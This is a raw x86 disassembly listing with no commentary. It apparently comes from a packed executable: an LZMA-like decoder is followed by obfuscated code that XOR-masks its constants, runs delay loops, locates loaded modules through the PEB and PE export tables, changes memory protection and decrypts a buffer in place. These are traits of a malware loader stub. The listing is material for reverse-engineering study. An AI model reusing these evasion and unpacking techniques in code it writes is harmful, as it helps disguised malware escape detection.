  416d57:	pop    esi
  416d58:	sub    edi,edi
  416d5a:	inc    edi
  416d5b:	mov    eax,edi
  416d5d:	mov    ebp,DWORD PTR [ebp-0x34]
  416d60:	call   0x416e1b
  416d65:	test   al,0x1
  416d67:	je     0x416d6c
  416d69:	or     DWORD PTR [ebp-0x24],edi
  416d6c:	shl    edi,1
  416d6e:	dec    esi
  416d6f:	jne    0x416d5d
  416d71:	jmp    0x416d73
  416d73:	inc    DWORD PTR [ebp-0x24]
  416d76:	mov    ecx,DWORD PTR [ebp-0x1c]
  416d79:	add    ecx,0x2
  416d7c:	mov    edi,DWORD PTR [ebp-0x4]
  416d7f:	mov    eax,edi
  416d81:	sub    eax,DWORD PTR [ebp+0x24]
  416d84:	cmp    DWORD PTR [ebp-0x24],eax
  416d87:	ja     0x416dd3
  416d89:	mov    esi,edi
  416d8b:	sub    esi,DWORD PTR [ebp-0x24]
  416d8e:	mov    edx,DWORD PTR [ebp+0x28]
  416d91:	lods   al,BYTE PTR ds:[esi]
  416d92:	stos   BYTE PTR es:[edi],al
  416d93:	cmp    edi,edx
  416d95:	jae    0x416d9a
  416d97:	dec    ecx
  416d98:	jne    0x416d91
  416d9a:	mov    DWORD PTR [ebp-0x4],edi
  416d9d:	movzx  esi,al
  416da0:	cmp    edi,DWORD PTR [ebp+0x28]
  416da3:	jb     0x416b04
  416da9:	call   0x416dd8
  416dae:	sub    eax,eax
  416db0:	lea    ebp,[esp+0x3c]
  416db4:	mov    edx,DWORD PTR [ebp+0x20]
  416db7:	mov    esi,DWORD PTR [ebp-0x8]
  416dba:	sub    esi,DWORD PTR [ebp+0x18]
  416dbd:	mov    DWORD PTR [edx],esi
  416dbf:	mov    edx,DWORD PTR [ebp+0x2c]
  416dc2:	mov    edi,DWORD PTR [ebp-0x4]
  416dc5:	sub    edi,DWORD PTR [ebp+0x24]
  416dc8:	mov    DWORD PTR [edx],edi
  416dca:	leave  
  416dcb:	pop    ebx
  416dcc:	pop    esi
  416dcd:	pop    edi
  416dce:	ret    0x1c
  416dd1:	pop    esi
  416dd2:	pop    eax
  416dd3:	sub    eax,eax
  416dd5:	inc    eax
  416dd6:	jmp    0x416db0
  416dd8:	cmp    ebx,0x1000000
  416dde:	jb     0x416de1
  416de0:	ret    
  416de1:	shl    ebx,0x8
  416de4:	push   esi
  416de5:	mov    esi,DWORD PTR [ebp-0x8]
  416de8:	cmp    esi,DWORD PTR [ebp+0x1c]
  416deb:	jae    0x416dd1
  416ded:	mov    eax,DWORD PTR [ebp-0x20]
  416df0:	shl    eax,0x8
  416df3:	lods   al,BYTE PTR ds:[esi]
  416df4:	mov    DWORD PTR [ebp-0x20],eax
  416df7:	mov    DWORD PTR [ebp-0x8],esi
  416dfa:	pop    esi
  416dfb:	ret    
  416dfc:	mov    ecx,DWORD PTR [ebp-0x3c]
  416dff:	movzx  eax,al
  416e02:	shl    ecx,0x4
  416e05:	add    eax,DWORD PTR [ebp-0x18]
  416e08:	add    eax,ecx
  416e0a:	jmp    0x416e12
  416e0c:	movzx  eax,al
  416e0f:	add    eax,DWORD PTR [ebp-0x3c]
  416e12:	mov    ebp,DWORD PTR [ebp-0x38]
  416e15:	lea    ebp,[ebp+eax*2+0x0]
  416e19:	sub    eax,eax
  416e1b:	lea    ebp,[ebp+eax*2+0x0]
  416e1f:	cmp    ebx,0x1000000
  416e25:	jae    0x416e43
  416e27:	mov    ecx,DWORD PTR [esp+0x38]
  416e2b:	shl    DWORD PTR [esp+0x20],0x8
  416e30:	cmp    ecx,DWORD PTR [esp+0x5c]
  416e34:	jae    0x416dd2
  416e36:	mov    dl,BYTE PTR [ecx]
  416e38:	inc    DWORD PTR [esp+0x38]
  416e3c:	shl    ebx,0x8
  416e3f:	mov    BYTE PTR [esp+0x20],dl
  416e43:	mov    ecx,ebx
  416e45:	movzx  edx,WORD PTR [ebp+0x0]
  416e49:	shr    ecx,0xb
  416e4c:	imul   ecx,edx
  416e4f:	cmp    DWORD PTR [esp+0x20],ecx
  416e53:	jae    0x416e6c
  416e55:	mov    ebx,ecx
  416e57:	mov    ecx,0x800
  416e5c:	sub    ecx,edx
  416e5e:	shr    ecx,0x5
  416e61:	add    WORD PTR [ebp+0x0],cx
  416e65:	add    eax,eax
  416e67:	lea    ebp,[esp+0x40]
  416e6b:	ret    
  416e6c:	shr    edx,0x5
  416e6f:	sub    DWORD PTR [esp+0x20],ecx
  416e73:	sub    ebx,ecx
  416e75:	sub    WORD PTR [ebp+0x0],dx
  416e79:	add    eax,eax
  416e7b:	add    eax,0x1
  416e7e:	lea    ebp,[esp+0x40]
  416e82:	ret    
  416e83:	push   ebp
  416e84:	mov    ebp,esp
  416e86:	sub    esp,0x104
  416e8c:	push   ebx
  416e8d:	push   esi
  416e8e:	push   edi
  416e8f:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  416e96:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  416e9d:	mov    eax,DWORD PTR [ebp+0x8]
  416ea0:	mov    DWORD PTR [ebp+0x8],eax
  416ea3:	mov    ecx,DWORD PTR [ebp-0x14]
  416ea6:	mov    ebx,0x751089b
  416eab:	xor    ecx,ebx
  416ead:	mov    eax,0x3272e2
  416eb2:	add    ecx,eax
  416eb4:	mov    DWORD PTR [ebp-0x2c],ecx
  416eb7:	mov    ecx,DWORD PTR [ebp-0x14]
  416eba:	xor    ecx,ebx
  416ebc:	add    ecx,eax
  416ebe:	mov    DWORD PTR [ebp-0x3c],ecx
  416ec1:	mov    ecx,DWORD PTR [ebp-0x14]
  416ec4:	xor    ecx,ebx
  416ec6:	add    ecx,eax
  416ec8:	mov    DWORD PTR [ebp-0x40],ecx
  416ecb:	mov    ecx,DWORD PTR [ebp-0x14]
  416ece:	xor    ecx,ebx
  416ed0:	add    ecx,eax
  416ed2:	mov    DWORD PTR [ebp-0xa0],ecx
  416ed8:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  416edf:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  416ee6:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  416eed:	push   0x25
  416eef:	pop    ecx
  416ef0:	mov    DWORD PTR [ebp-0x34],ecx
  416ef3:	mov    DWORD PTR [ebp-0x34],ecx
  416ef6:	push   0x65
  416ef8:	pop    ecx
  416ef9:	mov    DWORD PTR [ebp-0x34],ecx
  416efc:	mov    DWORD PTR [ebp-0x34],ecx
  416eff:	mov    DWORD PTR [ebp-0x34],0x4d
  416f06:	mov    DWORD PTR [ebp-0x34],0x43
  416f0d:	mov    ecx,DWORD PTR [ebp-0x14]
  416f10:	xor    ecx,ebx
  416f12:	add    ecx,eax
  416f14:	mov    DWORD PTR [ebp-0x34],ecx
  416f17:	mov    ecx,DWORD PTR [ebp-0x14]
  416f1a:	xor    ecx,ebx
  416f1c:	add    ecx,eax
  416f1e:	mov    DWORD PTR [ebp-0x34],ecx
  416f21:	mov    DWORD PTR [ebp-0x28],0x257
  416f28:	mov    DWORD PTR [ebp-0x20],0x35
  416f2f:	mov    DWORD PTR [ebp-0x10],0x79
  416f36:	lea    edi,[ebp-0xe4]
  416f3c:	lea    esi,[ebp-0x104]
  416f42:	call   0x417b5e
  416f47:	dec    DWORD PTR [ebp-0x10]
  416f4a:	jne    0x416f36
  416f4c:	dec    DWORD PTR [ebp-0x20]
  416f4f:	jne    0x416f2f
  416f51:	dec    DWORD PTR [ebp-0x28]
  416f54:	jne    0x416f28
  416f56:	mov    DWORD PTR [ebp-0x28],0x400d
  416f5d:	mov    eax,DWORD PTR [ebp-0x14]
  416f60:	xor    eax,ebx
  416f62:	mov    esi,0x3272e2
  416f67:	add    eax,esi
  416f69:	mov    DWORD PTR [ebp-0x8],eax
  416f6c:	mov    eax,DWORD PTR [ebp-0x14]
  416f6f:	and    DWORD PTR [ebp-0x94],0x0
  416f76:	xor    eax,ebx
  416f78:	add    eax,esi
  416f7a:	mov    DWORD PTR [ebp-0x38],eax
  416f7d:	mov    eax,fs:0x18
  416f83:	mov    DWORD PTR [ebp-0x94],eax
  416f89:	mov    eax,DWORD PTR [eax+0x30]
  416f8c:	mov    DWORD PTR [ebp-0x98],eax
  416f92:	mov    eax,DWORD PTR [eax+0xc]
  416f95:	mov    DWORD PTR [ebp-0xc0],eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x8]
  416f9e:	lea    ecx,[ebp-0x94]
  416fa4:	mov    DWORD PTR [eax+0x1a0],ecx
  416faa:	mov    eax,DWORD PTR [ebp+0x8]
  416fad:	lea    ecx,[ebp-0x98]
  416fb3:	mov    DWORD PTR [eax+0x1a4],ecx
  416fb9:	mov    eax,DWORD PTR [ebp+0x8]
  416fbc:	push   DWORD PTR [ebp+0x8]
  416fbf:	lea    ecx,[ebp-0xc0]
  416fc5:	mov    DWORD PTR [eax+0x1a8],ecx
  416fcb:	call   0x419344
  416fd0:	mov    ecx,DWORD PTR [ebp-0x14]
  416fd3:	xor    ecx,ebx
  416fd5:	add    ecx,esi
  416fd7:	cmp    ecx,eax
  416fd9:	je     0x4172b6
  416fdf:	mov    eax,DWORD PTR [ebp+0x8]
  416fe2:	mov    eax,DWORD PTR [eax+0x194]
  416fe8:	mov    ecx,DWORD PTR [eax]
  416fea:	mov    eax,DWORD PTR [ebp+0x8]
  416fed:	mov    eax,DWORD PTR [eax+0x194]
  416ff3:	mov    eax,DWORD PTR [eax]
  416ff5:	add    eax,DWORD PTR [ecx+0x3c]
  416ff8:	mov    ecx,DWORD PTR [ebp+0x8]
  416ffb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  417001:	lea    edx,[ebp-0xc4]
  417007:	push   edx
  417008:	mov    edx,DWORD PTR [ebp+0x8]
  41700b:	mov    edx,DWORD PTR [edx+0x18c]
  417011:	mov    edx,DWORD PTR [edx]
  417013:	add    edx,DWORD PTR [eax+0x88]
  417019:	push   0x4
  41701b:	push   DWORD PTR [eax+0x8c]
  417021:	push   edx
  417022:	call   DWORD PTR [ecx+0x1c]
  417025:	push   DWORD PTR [ebp+0x8]
  417028:	mov    edi,DWORD PTR [ebp+0x8]
  41702b:	mov    eax,DWORD PTR [ebp+0x8]
  41702e:	mov    edx,DWORD PTR [eax+0x1b8]
  417034:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41703b:	mov    DWORD PTR [ebp-0x64],0x50c011f
  417042:	mov    WORD PTR [ebp-0x60],0x7c3d
  417048:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  417052:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41705c:	mov    DWORD PTR [ebp-0x88],0x221d040c
  417066:	mov    DWORD PTR [ebp-0x84],0xe190109
  417070:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  417077:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41707e:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  417085:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41708c:	mov    DWORD PTR [ebp-0x70],0xe190109
  417093:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41709a:	call   0x419373
  41709f:	push   eax
  4170a0:	mov    eax,DWORD PTR [ebp+0x8]
  4170a3:	mov    eax,DWORD PTR [eax+0x1a8]
  4170a9:	push   DWORD PTR [eax]
  4170ab:	call   0x419014
  4170b0:	test   eax,eax
  4170b2:	jne    0x417104
  4170b4:	mov    eax,DWORD PTR [ebp+0x8]
  4170b7:	mov    eax,DWORD PTR [eax+0x1d8]
  4170bd:	mov    edi,DWORD PTR [ebp+0x8]
  4170c0:	add    eax,0x4
  4170c3:	mov    DWORD PTR [ebp-0x24],eax
  4170c6:	mov    eax,DWORD PTR [ebp+0x8]
  4170c9:	mov    edx,DWORD PTR [eax+0x1b8]
  4170cf:	call   0x419373
  4170d4:	push   eax
  4170d5:	mov    eax,DWORD PTR [ebp-0x24]
  4170d8:	call   DWORD PTR [eax]
  4170da:	test   eax,eax
  4170dc:	jne    0x417104
  4170de:	mov    eax,DWORD PTR [ebp+0x8]
  4170e1:	mov    eax,DWORD PTR [eax+0x1d8]
  4170e7:	mov    edi,DWORD PTR [ebp+0x8]
  4170ea:	add    eax,0x10
  4170ed:	mov    DWORD PTR [ebp-0x24],eax
  4170f0:	mov    eax,DWORD PTR [ebp+0x8]
  4170f3:	mov    edx,DWORD PTR [eax+0x1b8]
  4170f9:	call   0x419373
  4170fe:	push   eax
  4170ff:	mov    eax,DWORD PTR [ebp-0x24]
  417102:	call   DWORD PTR [eax]
  417104:	mov    eax,DWORD PTR [ebp-0x14]
  417107:	mov    ecx,DWORD PTR [ebp-0x28]
  41710a:	xor    eax,ebx
  41710c:	add    eax,esi
  41710e:	cmp    eax,ecx
  417110:	je     0x41728f
  417116:	mov    eax,DWORD PTR [ebp-0x18]
  417119:	xor    eax,ebx
  41711b:	mov    ecx,0xffcd8d1e
  417120:	sub    ecx,eax
  417122:	add    ecx,DWORD PTR [ebp-0x28]
  417125:	mov    eax,DWORD PTR [ebp-0x8]
  417128:	cmp    eax,ecx
  41712a:	ja     0x41728f
  417130:	mov    DWORD PTR [ebp-0x20],0x0
  417137:	push   DWORD PTR [ebp+0x8]
  41713a:	mov    edi,DWORD PTR [ebp+0x8]
  41713d:	mov    eax,DWORD PTR [ebp+0x8]
  417140:	mov    edx,DWORD PTR [eax+0x1b4]
  417146:	call   0x419373
  41714b:	push   eax
  41714c:	mov    eax,DWORD PTR [ebp+0x8]
  41714f:	mov    eax,DWORD PTR [eax+0x1a8]
  417155:	push   DWORD PTR [eax]
  417157:	call   0x419014
  41715c:	mov    ecx,DWORD PTR [ebp+0x8]
  41715f:	mov    ecx,DWORD PTR [ecx+0x19c]
  417165:	mov    DWORD PTR [ecx],eax
  417167:	mov    eax,DWORD PTR [ebp+0x8]
  41716a:	mov    edi,DWORD PTR [eax+0x1d8]
  417170:	mov    esi,DWORD PTR [ebp+0x8]
  417173:	xor    eax,eax
  417175:	lea    edx,[ebp-0x7c]
  417178:	call   0x4193a9
  41717d:	push   eax
  41717e:	mov    eax,DWORD PTR [ebp+0x8]
  417181:	mov    eax,DWORD PTR [eax+0x19c]
  417187:	push   DWORD PTR [eax]
  417189:	call   DWORD PTR [edi+0x8]
  41718c:	mov    DWORD PTR [ebp-0x24],eax
  41718f:	mov    eax,DWORD PTR [ebp+0x8]
  417192:	mov    edi,DWORD PTR [eax+0x1d8]
  417198:	mov    esi,DWORD PTR [ebp+0x8]
  41719b:	xor    eax,eax
  41719d:	lea    edx,[ebp-0x90]
  4171a3:	call   0x4193a9
  4171a8:	push   eax
  4171a9:	mov    eax,DWORD PTR [ebp+0x8]
  4171ac:	mov    eax,DWORD PTR [eax+0x19c]
  4171b2:	push   DWORD PTR [eax]
  4171b4:	call   DWORD PTR [edi+0x8]
  4171b7:	and    DWORD PTR [ebp-0x1c],0x0
  4171bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4171be:	and    eax,0x7
  4171c1:	add    eax,0x31
  4171c4:	push   eax
  4171c5:	call   DWORD PTR [ebp-0x24]
  4171c8:	test   eax,eax
  4171ca:	jne    0x4171d1
  4171cc:	and    DWORD PTR [ebp-0x10],eax
  4171cf:	jmp    0x4171f9
  4171d1:	mov    eax,DWORD PTR [ebp+0x8]
  4171d4:	mov    edi,DWORD PTR [eax+0x1d8]
  4171da:	mov    esi,DWORD PTR [ebp+0x8]
  4171dd:	xor    eax,eax
  4171df:	lea    edx,[ebp-0x68]
  4171e2:	call   0x4193a9
  4171e7:	push   eax
  4171e8:	mov    eax,DWORD PTR [ebp+0x8]
  4171eb:	mov    eax,DWORD PTR [eax+0x198]
  4171f1:	push   DWORD PTR [eax]
  4171f3:	call   DWORD PTR [edi+0x8]
  4171f6:	mov    DWORD PTR [ebp-0x10],eax
  4171f9:	inc    DWORD PTR [ebp-0x1c]
  4171fc:	cmp    DWORD PTR [ebp-0x1c],0x10
  417200:	jb     0x4171bb
  417202:	mov    eax,DWORD PTR [ebp-0x18]
  417205:	mov    esi,DWORD PTR [ebp+0x8]
  417208:	xor    eax,ebx
  41720a:	mov    edi,0x3272e2
  41720f:	add    eax,edi
  417211:	lea    edx,[ebp-0xe4]
  417217:	call   0x4193a9
  41721c:	push   eax
  41721d:	mov    eax,DWORD PTR [ebp-0x14]
  417220:	mov    esi,DWORD PTR [ebp+0x8]
  417223:	xor    eax,ebx
  417225:	add    eax,edi
  417227:	lea    edx,[ebp-0x104]
  41722d:	call   0x4193a9
  417232:	push   eax
  417233:	call   DWORD PTR [ebp-0x10]
  417236:	mov    ecx,DWORD PTR [ebp-0x14]
  417239:	xor    ecx,ebx
  41723b:	add    ecx,edi
  41723d:	cmp    ecx,eax
  41723f:	jne    0x417248
  417241:	mov    DWORD PTR [ebp-0x20],0x1
  417248:	mov    eax,DWORD PTR [ebp-0x18]
  41724b:	mov    ecx,DWORD PTR [ebp-0x8]
  41724e:	xor    eax,ebx
  417250:	lea    eax,[eax+ecx*1+0x3272e2]
  417257:	mov    DWORD PTR [ebp-0x8],eax
  41725a:	mov    eax,DWORD PTR [ebp-0x20]
  41725d:	test   eax,eax
  41725f:	je     0x417273
  417261:	mov    eax,DWORD PTR [ebp-0x18]
  417264:	mov    ecx,DWORD PTR [ebp-0x38]
  417267:	xor    eax,ebx
  417269:	lea    eax,[eax+ecx*1+0x3272e2]
  417270:	mov    DWORD PTR [ebp-0x38],eax
  417273:	mov    eax,DWORD PTR [ebp-0x18]
  417276:	xor    eax,ebx
  417278:	mov    ecx,0xffcd8d1e
  41727d:	sub    ecx,eax
  41727f:	add    ecx,DWORD PTR [ebp-0x28]
  417282:	mov    eax,DWORD PTR [ebp-0x8]
  417285:	cmp    eax,ecx
  417287:	jbe    0x417130
  41728d:	mov    esi,edi
  41728f:	mov    eax,DWORD PTR [ebp-0x38]
  417292:	mov    ecx,DWORD PTR [ebp-0x8]
  417295:	cmp    ecx,eax
  417297:	jne    0x4172aa
  417299:	push   DWORD PTR [ebp+0x8]
  41729c:	lea    eax,[ebp-0x3c]
  41729f:	push   eax
  4172a0:	call   0x419e21
  4172a5:	mov    DWORD PTR [ebp-0x2c],eax
  4172a8:	jmp    0x4172b6
  4172aa:	mov    eax,DWORD PTR [ebp-0x2c]
  4172ad:	mov    ecx,DWORD PTR [ebp-0x18]
  4172b0:	xor    ecx,ebx
  4172b2:	add    ecx,esi
  4172b4:	xor    DWORD PTR [eax],ecx
  4172b6:	mov    eax,DWORD PTR [ebp-0x14]
  4172b9:	mov    ecx,DWORD PTR [ebp-0x2c]
  4172bc:	xor    eax,ebx
  4172be:	add    eax,esi
  4172c0:	cmp    eax,ecx
  4172c2:	je     0x417a3c
  4172c8:	mov    eax,DWORD PTR [ebp-0x14]
  4172cb:	mov    ecx,DWORD PTR [ebp-0x3c]
  4172ce:	xor    eax,ebx
  4172d0:	add    eax,esi
  4172d2:	cmp    eax,ecx
  4172d4:	je     0x417a3c
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	xor    eax,ebx
  4172df:	add    eax,esi
  4172e1:	jmp    0x4172ff
  4172e3:	mov    edi,DWORD PTR [ebp-0x2c]
  4172e6:	mov    cl,al
  4172e8:	and    cl,0x1f
  4172eb:	or     dl,0xff
  4172ee:	sub    dl,cl
  4172f0:	add    BYTE PTR [edi+eax*1],dl
  4172f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4172f6:	xor    ecx,ebx
  4172f8:	lea    eax,[eax+ecx*1+0x3272e2]
  4172ff:	mov    ecx,DWORD PTR [ebp-0x3c]
  417302:	cmp    eax,ecx
  417304:	jb     0x4172e3
  417306:	mov    eax,DWORD PTR [ebp-0x3c]
  417309:	mov    DWORD PTR [ebp-0x28],eax
  41730c:	mov    eax,DWORD PTR [ebp-0x2c]
  41730f:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  417316:	mov    DWORD PTR [ebp-0xbc],eax
  41731c:	mov    edi,0xf89c8584
  417321:	mov    DWORD PTR [ebp-0x30],edi
  417324:	mov    eax,DWORD PTR [ebp-0x38]
  417327:	xor    eax,ebx
  417329:	add    eax,esi
  41732b:	mov    DWORD PTR [ebp-0xc],eax
  41732e:	mov    eax,DWORD PTR [ebp-0x38]
  417331:	xor    eax,ebx
  417333:	add    eax,esi
  417335:	mov    DWORD PTR [ebp-0x8],eax
  417338:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41733f:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  417346:	mov    eax,DWORD PTR [ebp-0x38]
  417349:	mov    ecx,DWORD PTR [ebp-0x28]
  41734c:	xor    eax,ebx
  41734e:	add    eax,esi
  417350:	cmp    ecx,eax
  417352:	je     0x417551
  417358:	jmp    0x41752d
  41735d:	mov    ecx,DWORD PTR [ebp-0xc]
  417360:	mov    eax,DWORD PTR [ebp-0x28]
  417363:	sub    eax,ecx
  417365:	mov    ecx,DWORD PTR [ebp-0x48]
  417368:	xor    ecx,ebx
  41736a:	add    ecx,esi
  41736c:	xor    edx,edx
  41736e:	div    ecx
  417370:	mov    DWORD PTR [ebp-0x8],eax
  417373:	mov    eax,DWORD PTR [ebp-0x54]
  417376:	mov    ecx,DWORD PTR [ebp-0x8]
  417379:	xor    eax,ebx
  41737b:	add    eax,esi
  41737d:	cmp    ecx,eax
  41737f:	jbe    0x41738b
  417381:	mov    eax,DWORD PTR [ebp-0x54]
  417384:	xor    eax,ebx
  417386:	add    eax,esi
  417388:	mov    DWORD PTR [ebp-0x8],eax
  41738b:	mov    eax,DWORD PTR [ebp-0x48]
  41738e:	mov    ecx,DWORD PTR [ebp-0x8]
  417391:	xor    eax,ebx
  417393:	add    eax,esi
  417395:	imul   eax,ecx
  417398:	mov    DWORD PTR [ebp-0x8],eax
  41739b:	mov    eax,DWORD PTR [ebp-0x38]
  41739e:	mov    ecx,DWORD PTR [ebp-0x8]
  4173a1:	xor    eax,ebx
  4173a3:	add    eax,esi
  4173a5:	cmp    ecx,eax
  4173a7:	je     0x41751b
  4173ad:	mov    eax,DWORD PTR [ebp-0x8]
  4173b0:	mov    DWORD PTR [ebp-0x10],eax
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	add    eax,DWORD PTR [ebp-0xbc]
  4173bc:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  4173c3:	mov    DWORD PTR [ebp-0x20],edi
  4173c6:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  4173d0:	mov    DWORD PTR [ebp-0x8],eax
  4173d3:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  4173da:	mov    DWORD PTR [ebp-0x1c],edi
  4173dd:	mov    eax,DWORD PTR [ebp-0x24]
  4173e0:	xor    eax,ebx
  4173e2:	add    eax,esi
  4173e4:	jmp    0x4174da
  4173e9:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  4173f3:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  4173fd:	mov    eax,DWORD PTR [ebp-0x1c]
  417400:	mov    ecx,DWORD PTR [ebp-0x44]
  417403:	xor    eax,ebx
  417405:	add    eax,esi
  417407:	imul   eax,ecx
  41740a:	mov    ecx,DWORD PTR [ebp-0x8]
  41740d:	mov    al,BYTE PTR [eax+ecx*1]
  417410:	mov    BYTE PTR [ebp-0x2],al
  417413:	mov    eax,DWORD PTR [ebp-0x1c]
  417416:	mov    ecx,DWORD PTR [ebp-0x44]
  417419:	xor    eax,ebx
  41741b:	add    eax,esi
  41741d:	imul   eax,ecx
  417420:	mov    ecx,DWORD PTR [ebp-0xa8]
  417426:	xor    ecx,ebx
  417428:	add    eax,ecx
  41742a:	mov    ecx,DWORD PTR [ebp-0x8]
  41742d:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417435:	mov    ecx,DWORD PTR [ebp-0xb0]
  41743b:	xor    ecx,ebx
  41743d:	lea    eax,[ecx+eax*1+0x3272e2]
  417444:	movzx  ecx,BYTE PTR [ebp-0x2]
  417448:	xor    ecx,eax
  41744a:	mov    BYTE PTR [ebp-0x2],cl
  41744d:	mov    al,BYTE PTR [ebp-0x2]
  417450:	mov    ecx,DWORD PTR [ebp-0x1c]
  417453:	mov    edx,DWORD PTR [ebp-0x44]
  417456:	xor    ecx,ebx
  417458:	add    ecx,esi
  41745a:	imul   ecx,edx
  41745d:	mov    edx,DWORD PTR [ebp-0x8]
  417460:	mov    BYTE PTR [ecx+edx*1],al
  417463:	mov    eax,DWORD PTR [ebp-0x1c]
  417466:	mov    ecx,DWORD PTR [ebp-0x44]
  417469:	xor    eax,ebx
  41746b:	add    eax,esi
  41746d:	imul   eax,ecx
  417470:	mov    ecx,DWORD PTR [ebp-0x8]
  417473:	mov    al,BYTE PTR [eax+ecx*1]
  417476:	mov    BYTE PTR [ebp-0x2],al
  417479:	mov    eax,DWORD PTR [ebp-0x1c]
  41747c:	mov    ecx,DWORD PTR [ebp-0x44]
  41747f:	xor    eax,ebx
  417481:	add    eax,esi
  417483:	imul   eax,ecx
  417486:	mov    ecx,DWORD PTR [ebp-0x20]
  417489:	xor    ecx,ebx
  41748b:	add    eax,ecx
  41748d:	mov    ecx,DWORD PTR [ebp-0x8]
  417490:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  417498:	mov    ecx,DWORD PTR [ebp-0xb8]
  41749e:	xor    ecx,ebx
  4174a0:	lea    eax,[ecx+eax*1+0x3272e2]
  4174a7:	movzx  ecx,BYTE PTR [ebp-0x2]
  4174ab:	xor    ecx,eax
  4174ad:	mov    BYTE PTR [ebp-0x2],cl
  4174b0:	mov    al,BYTE PTR [ebp-0x2]
  4174b3:	mov    ecx,DWORD PTR [ebp-0x1c]
  4174b6:	mov    edx,DWORD PTR [ebp-0x44]
  4174b9:	xor    ecx,ebx
  4174bb:	add    ecx,esi
  4174bd:	imul   ecx,edx
  4174c0:	mov    edx,DWORD PTR [ebp-0x8]
  4174c3:	mov    BYTE PTR [ecx+edx*1],al
  4174c6:	mov    eax,DWORD PTR [ebp-0x34]
  4174c9:	mov    ecx,DWORD PTR [ebp-0x20]
  4174cc:	xor    eax,ebx
  4174ce:	xor    ecx,ebx
  4174d0:	add    eax,esi
  4174d2:	add    ecx,esi
  4174d4:	imul   eax,ecx
  4174d7:	add    eax,DWORD PTR [ebp-0x44]
  4174da:	mov    DWORD PTR [ebp-0x44],eax
  4174dd:	mov    eax,DWORD PTR [ebp-0x44]
  4174e0:	mov    ecx,DWORD PTR [ebp-0x10]
  4174e3:	cmp    ecx,eax
  4174e5:	jb     0x4173e9
  4174eb:	mov    eax,DWORD PTR [ebp-0x20]
  4174ee:	mov    ecx,DWORD PTR [ebp-0x10]
  4174f1:	xor    eax,ebx
  4174f3:	add    eax,esi
  4174f5:	imul   eax,ecx
  4174f8:	mov    ecx,DWORD PTR [ebp-0x24]
  4174fb:	xor    ecx,ebx
  4174fd:	add    ecx,esi
  4174ff:	or     eax,ecx
  417501:	mov    ecx,DWORD PTR [ebp-0x30]
  417504:	xor    ecx,ebx
  417506:	add    eax,ecx
  417508:	mov    ecx,DWORD PTR [ebp-0x30]
  41750b:	xor    ecx,ebx
  41750d:	add    eax,ecx
  41750f:	mov    ecx,DWORD PTR [ebp-0xc]
  417512:	lea    eax,[eax+ecx*1+0x64e5c4]
  417519:	jmp    0x41752a
  41751b:	mov    eax,DWORD PTR [ebp-0x30]
  41751e:	mov    ecx,DWORD PTR [ebp-0xc]
  417521:	xor    eax,ebx
  417523:	lea    eax,[eax+ecx*1+0x3272e2]
  41752a:	mov    DWORD PTR [ebp-0xc],eax
  41752d:	mov    eax,DWORD PTR [ebp-0x30]
  417530:	xor    eax,ebx
  417532:	mov    ecx,0xffcd8d1e
  417537:	sub    ecx,eax
  417539:	add    ecx,DWORD PTR [ebp-0x28]
  41753c:	mov    eax,DWORD PTR [ebp-0x30]
  41753f:	mov    edx,DWORD PTR [ebp-0xc]
  417542:	xor    eax,ebx
  417544:	add    eax,esi
  417546:	imul   eax,edx
  417549:	cmp    eax,ecx
  41754b:	jbe    0x41735d
  417551:	mov    eax,DWORD PTR [ebp-0x14]
  417554:	mov    ecx,DWORD PTR [ebp-0x3c]
  417557:	mov    eax,DWORD PTR [ebp+0x8]
  41755a:	mov    edx,DWORD PTR [ebp-0x4c]
  41755d:	mov    eax,DWORD PTR [eax+0x1d8]
  417563:	xor    edx,ebx
  417565:	add    edx,esi
  417567:	push   edx
  417568:	mov    edx,DWORD PTR [ebp-0x40]
  41756b:	xor    edx,ebx
  41756d:	add    edx,esi
  41756f:	push   edx
  417570:	push   ecx
  417571:	mov    DWORD PTR [ebp-0x34],ecx
  417574:	mov    ecx,DWORD PTR [ebp-0x14]
  417577:	xor    ecx,ebx
  417579:	add    ecx,esi
  41757b:	push   ecx
  41757c:	call   DWORD PTR [eax+0x14]
  41757f:	mov    edi,eax
  417581:	mov    eax,DWORD PTR [ebp-0x14]
  417584:	xor    eax,ebx
  417586:	add    eax,esi
  417588:	cmp    eax,edi
  41758a:	je     0x4175e5
  41758c:	mov    eax,DWORD PTR [ebp-0x14]
  41758f:	jmp    0x4175b2
  417591:	mov    ecx,DWORD PTR [ebp-0x2c]
  417594:	xor    eax,ebx
  417596:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41759d:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  4175a4:	mov    ecx,DWORD PTR [ebp-0x18]
  4175a7:	xor    ecx,ebx
  4175a9:	lea    eax,[ecx+eax*1+0x3272e2]
  4175b0:	xor    eax,ebx
  4175b2:	mov    ecx,DWORD PTR [ebp-0x3c]
  4175b5:	sub    ecx,esi
  4175b7:	xor    ecx,ebx
  4175b9:	cmp    eax,ecx
  4175bb:	jne    0x417591
  4175bd:	mov    eax,DWORD PTR [ebp+0x8]
